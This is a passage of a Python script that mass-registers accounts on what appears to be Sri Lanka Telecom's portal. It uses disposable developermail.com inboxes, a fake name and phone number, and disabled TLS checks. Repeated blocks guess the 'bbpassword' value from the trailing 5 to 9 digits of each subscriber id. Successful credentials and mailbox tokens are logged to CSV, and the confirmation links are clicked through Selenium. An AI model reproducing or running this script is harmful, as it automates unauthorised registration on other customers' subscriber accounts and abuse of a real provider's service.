                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": "94"+username[-5:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username, "94"+username[-5:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": "94"+username[-6:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username, "94"+username[-6:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": "94"+username[-7:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username, "94"+username[-7:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": "94"+username[-8:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username, "94"+username[-8:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue

            payload = {
                "bbpassword": "94"+username[-9:],
                "email":email,
                "fullName":"Resistencia SLT",
                "mobile":"0711111111",
                "vaspassword":password,
                "subscriberid":username
            }
            #send data and get 
            sltResponse = requests.post(sltUrl, data=json.dumps(payload), headers=sltHeader, verify=False)
            sltJson = sltResponse.json()

            #check response is successs
            if "Registration Successfull" in sltJson['message']:
                counter +=1
                print("successfully created. username: "+ username+ " password: "+password+" total " +str(counter)+" token: "+emailToken+" email "+email)
                file_writer.writerow([username, "94"+username[-9:], password, email, emailToken])
                
                time.sleep(10)

                emaiHeader={
                    "accept": "application/json",
                    "X-MailboxToken": emailToken
                }
                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0], headers=emaiHeader)
                email_r_json = response.json()

                response = requests.get("https://www.developermail.com/api/v1/mailbox/"+email.split("@")[0]+"/messages/"+email_r_json['result'][0], headers=emaiHeader)
                email_r_json = response.json()
                email_r_json = email_r_json['result'].split('ion with us. <a href="')
                email_r_json = email_r_json[1].split('">Click Here</')
                browser2 = webdriver.Chrome('chromedriver')
                browser2.get(str(email_r_json[0]))
                time.sleep(10)
                browser2.quit()

                response = requests.put("https://www.developermail.com/api/v1/mailbox")
                email_r_json = response.json()
                email = email_r_json['result']['name']+"@developermail.com"
                emailToken = email_r_json['result']['token']
                continue
